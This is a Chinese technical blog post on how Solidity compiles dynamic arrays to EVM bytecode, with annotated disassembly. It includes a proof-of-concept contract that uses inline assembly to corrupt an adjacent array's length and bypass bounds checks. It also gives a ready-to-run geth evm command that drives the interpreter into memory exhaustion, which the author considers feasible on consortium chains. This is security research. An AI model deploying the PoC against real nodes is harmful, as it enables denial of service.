

## solidity 动态数组原理分析



solidity 和Python ,JavaScript 一样,支持动态数组.我们知道,在Python 和JavaScript 里,动态数组内部的对象(比如:Length ,Slice() 等)都是底层设计好的对象结构,提供接口到运行时库来解析执行.那么在solidity 里面是怎么样表达动态数组的呢?我们从一段示例代码来深入:



```soli
pragma solidity ^0.4.24;

contract test {

    function a(uint[] b) {
        b[2]=0x10;
    }

}
```



这一段solidity 编译出来的汇编如下(无优化版本),在Remix 调试执行,参数是a([1,2,3]).



```assembly
000 PUSH1 80
002 PUSH1 40
004 MSTORE
005 PUSH1 04
007 CALLDATASIZE
008 LT
009 PUSH1 3e
011 JUMPI
----  Address 0x0C  Get Function Point And Dispatch  ----
012 PUSH4 ffffffff
017 PUSH29 0100000000000000000000000000000000000000000000000000000000
047 PUSH1 00
049 CALLDATALOAD
050 DIV
051 AND
052 PUSH4 1e3badd9  ;  Function a() hash ..
057 DUP2
058 EQ
059 PUSH1 43
061 JUMPI
----  Address 0x3E  Check Function point in CALLDATA Except  ----
062 JUMPDEST
063 PUSH1 00
065 DUP1
066 REVERT
----  Address 0x43  Function a() Pre-Check Code  ----
067 JUMPDEST
068 CALLVALUE
069 DUP1
070 ISZERO
071 PUSH1 4e
073 JUMPI
074 PUSH1 00
076 DUP1
077 REVERT
----  Address 0x4E  Function a() Argument-Check Code  ----
078 JUMPDEST
079 POP
080 PUSH1 40
082 DUP1
083 MLOAD
084 PUSH1 20
086 PUSH1 04
088 DUP1
089 CALLDATALOAD  ;  CALLDATALOAD 0x04,0x20 => b.length
090 DUP1
091 DUP3
092 ADD
093 CALLDATALOAD
094 DUP4
095 DUP2
096 MUL
097 DUP1
098 DUP7
099 ADD
100 DUP6
101 ADD
102 SWAP1
103 SWAP7
104 MSTORE
105 DUP1
106 DUP6
107 MSTORE
108 PUSH1 95
110 SWAP6
111 CALLDATASIZE  ;  Get CALLData Size
112 SWAP6
113 SWAP4
114 SWAP5
115 PUSH1 24
117 SWAP5
118 SWAP4
119 DUP6
120 ADD
121 SWAP3
122 SWAP2
123 DUP3
124 SWAP2
125 DUP6
126 ADD
127 SWAP1
128 DUP5
129 SWAP1
130 DUP1
131 DUP3
132 DUP5
133 CALLDATACOPY  ;  CALLData to Memory
134 POP
135 SWAP5
136 SWAP8
137 POP
138 PUSH1 97
140 SWAP7
141 POP
142 POP
143 POP
144 POP
145 POP
146 POP
147 POP
148 JUMP
----  Address 0x4E  Function a() Return Code  ----
149 JUMPDEST
150 STOP
----  Address 0x97  Function a() Main Code  ----
151 JUMPDEST
152 PUSH1 10    ;  赋值给数组的值0x10
154 DUP2
155 PUSH1 02    ;  数组索引0x02
157 DUP2
158 MLOAD       ;  MLOAD 0x80 ,获取数组长度
159 DUP2
160 LT          ;  0x03 <= 0x02
161 ISZERO
162 ISZERO      ;  两次ISZERO 的意思等于not ,即!(0x03 <= 0x02) => (0x03 > 0x02)
163 PUSH1 a7
165 JUMPI       ;  如果赋值长度小于uint[] b 的动态长度,那就去到0xA7,否则触发异常
166 INVALID     ;  触发异常退出合约执行
----  Address 0xA7  ----
167 JUMPDEST
168 PUSH1 20    ;  /
170 SWAP1       ;  |
171 DUP2        ;  |
172 MUL         ;  |  计算b[2] 在内存中的位置,然后给到MSTORE 保存.
173 SWAP1       ;  |
174 SWAP2       ;  |
175 ADD         ;  |
176 ADD         ;  \
177 MSTORE      ;  MSTORE 0xE0,0x10 .
178 POP
179 JUMP
180 STOP
```



从汇编代码里面可以了解到,动态数组b 在内存中是这样表示的:



![img](pic_temp1\1.webp.jpg)



在Remix 中调试栈的数据布局如下:



![img](pic_temp1\2.webp.jpg)



Solidity 在编译动态数组赋值时编译器会自动插入数组越界判断代码,注意汇编158 – 167 行代码.



```
157 DUP2
158 MLOAD       ;  MLOAD 0x80 ,获取数组长度
159 DUP2
160 LT          ;  0x03 <= 0x02
161 ISZERO
162 ISZERO      ;  两次ISZERO 的意思等于not ,即!(0x03 <= 0x02) => (0x03 > 0x02)
163 PUSH1 a7
165 JUMPI       ;  如果赋值长度小于uint[] b 的动态长度,那就去到0xA7,否则触发异常
166 INVALID     ;  触发异常退出合约执行
167 JUMPDEST
```



所以我们只能在动态数组长度以内来修改数据,一旦越过动态数组的长度,合约就会报错执行,那么有没有办法修改动态数组的长度呢?我们尝试直接修改`b.length = 0x10` 来对动态数组的长度进行修改,发现并不能通过编译.



```
pragma solidity ^0.4.24;

contract test {

    function a(uint[] b) {
        b.length = 0x10;
    }

}
```



![](pic_temp1\3.webp.jpg)



## 动态数组越界尝试



既然不能直接对动态数组的length 操作,那么我们可以在栈上部署两个连续的动态数组,通过操作第一个动态数组越界去修改第二个动态数组的长度,达到第二个动态数组可以突破任意长度的控制.PoC 如下：



```
pragma solidity ^0.4.24;

contract test {

    function a(uint[] b,uint[] c) {
        uint c_length = c.length;
        assembly {
            mstore(add(0x80,mul(3,0x20)),0x5)  //  因为直接写b[2] 会有长度判断,这样就可以绕过判断
        }
        c_length = c.length;   //  成功被修改成0x5
    }

}
```



对a() 的调用参数是[1,2],[3,4] .在mstore 指令执行的时候,0x80 是动态数组b 的起始位置,因为uint 类型的数组占0x20 字节,所以动态数组b 占用的内存是0x80 – 0xDF ,c 占用的内存是0xE0 – 0x13F .我们知道,动态数组c 的length 标志位在b[1] 的后面,所以我们修改了b[2] 的数据也就是修改了动态数组c 的length 标志位.



![img](pic_temp1\4.webp.jpg)



执行完MSTORE 指令之后,可以看到c.length 的值被修改了



![img](pic_temp1\6.webp.jpg)

###  

## 尝试越界写数据



```
pragma solidity ^0.4.24;

contract test {

    function a(uint[] b,uint[] c) {
        uint c_length = c.length;
        assembly {
            mstore(add(0x80,mul(3,0x20)),0xAAAAAAAA)
        }
        c_length = c.length;
        c[0xC800000] = 0xFF;
    }

}
```



我们来看主要代码的汇编部分:



```
----  Address 0xEF  function a() Main Code  ----
239 JUMPDEST
240 PUSH1 00
242 DUP2
243 MLOAD            ;  uint c_length = c.length;
244 SWAP1
245 POP
246 PUSH4 aaaaaaaa
251 PUSH1 20
253 PUSH1 03
255 MUL
256 PUSH1 80
258 ADD
259 MSTORE           ;  mstore(add(0x80,mul(3,0x20)),0xAAAAAAAA)
260 DUP2
261 MLOAD
262 SWAP1
263 POP
264 PUSH1 ff
266 DUP3
267 PUSH3 C800000
271 DUP2
272 MLOAD            ;  MLOAD 0x00 , 获取数组长度
273 DUP2
274 LT
275 ISZERO
276 ISZERO
277 PUSH2 011a
280 JUMPI            ;  判断0xC800000 是否越界,因为动态数组c 已经设置为0xAAAAAAA ,所以并不会触发判断失效
281 INVALID
282 JUMPDEST
283 SWAP1
284 PUSH1 20
286 ADD
287 SWAP1
288 PUSH1 20
290 MUL
291 ADD
292 DUP2
293 DUP2
294 MSTORE           ;  MSTORE 0xC80000,0xFF  =>  c[0xC800000] = 0xFF;
295 POP
296 POP
297 POP
298 POP
299 POP
300 JUMP
301 STOP
```



在go-ethereum 版下的EVM 执行测试代码,构造EVM 命令行测试代码如下:



```
./evm --code 608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806396f40e3d14610046575b600080fd5b34801561005257600080fd5b506100ed60048036038101908080359060200190820180359060200190808060200260200160405190810160405280939291908181526020018383602002808284378201915050505050509192919290803590602001908201803590602001908080602002602001604051908101604052809392919081815260200183836020028082843782019150505050505091929192905050506100ef565b005b60008151905063aaaaaaaa6020600302608001528151905060ff826210000081518110151561011a57fe5b90602001906020020181815250505050505600a165627a7a72305820fe133e12a0270131204b3cc47bb934f4d348bad747ca490adc53d935690806ac0029 --input 96f40e3d000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000004 --gas 10000000000000000 --debug run
```



找到EVM 程序,执行命令,可以使用top 命令观察系统运行情况



![img](pic_temp1\8.webp.jpg)



可以看到执行了一小段时间的EVM 解析器占用的内存情况

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`--debug` 选项还在不断输出内存数据



![img](pic_temp1\9.webp.jpg)



## gas 怎么办



我们知道,执行上面这段代码是需要消耗很多gas 的,因为在EVM 里面申请内存需要消耗gas ,计算方式如下：



```
#  Code-Location   https://github.com/ethereum/py-evm/blob/9870841a126fb53a6cbab2ef7bf3d46262fa23a8/eth/vm/computation.py#L75

def memory_gas_cost(size_in_bytes: int) -> int:
    size_in_words = ceil32(size_in_bytes) // 32
    linear_cost = size_in_words * GAS_MEMORY  #  GAS_MEMORY = 3
    quadratic_cost = size_in_words ** 2 // GAS_MEMORY_QUADRATIC_DENOMINATOR  #  GAS_MEMORY_QUADRATIC_DENOMINATOR = 512

    total_cost = linear_cost + quadratic_cost
    return total_cost
```



那么要申请200 MB 的内存,就需要消耗83905740800 gas ,按照每1 gas 价格为21 Gwei 来计算,则需要消耗1762.0205568 ETH ,要这么做显然是不现实的.



而且,每个区块是有gas limit 上限,也就是说这个块只能使用这么多的gas 来执行合约和转帐,一旦gas 消耗完之后将不再打包其它交易.当前的ETH 区块的gas limit 是8000029 ,最多可以分配63 KB 内存.所以并不能对节点上运行的链程序造成威胁.所以在以太坊的公链上是不能应用的,但是这种情况可能会存在于联盟链里,原因有两点:1.因为在联盟链里的gas 代价相对比公链要低,而且挖矿产出奖励很高,所以不担心gas 的消耗价格;2.因为联盟链会对TPS 有很高要求,会希望一个块可以打包很多数据和多次执行合约,故会调高gas limit ,那就有可能存在上面的问题.



目前在geth ,py-evm ,remix 上都存在这个内存溢出问题.